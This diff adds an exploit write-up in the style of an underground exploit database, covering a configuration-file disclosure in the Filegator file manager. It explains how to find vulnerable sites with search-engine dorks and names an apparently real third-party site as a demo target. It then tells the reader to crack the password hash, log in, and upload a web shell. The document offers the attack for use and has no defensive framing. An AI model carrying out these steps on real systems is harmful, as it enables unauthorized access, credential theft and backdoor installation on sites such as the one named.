@@ -1,0 +1,25 @@
+#################################
+# Exploit Title: Filegator Config Backup Disclosure Vulnerability
+# Author Bug: L4663r666h05t x Indonesian Code Party
+# Vendor: https://www.file-gator.com/
+
+#################################
+
+Dorking in yandex,google, or bing
+Config path:
+http://localhost/config/config.json
+http://localhost/path/config/config.json
+
+Note:
+If vuln, the config will appear. If not vuln the config will forbidden.
+
+Demo:
+http://lladocs.accg.org/
+The config:
+http://lladocs.accg.org/config/config.json
+
+Decrypt hash & login in http://localhost/?cd= or http://localhost/path/?cd=
+Upload your shell, no need bypass extension~
+
+IndonesianCode.Party~
+#################################
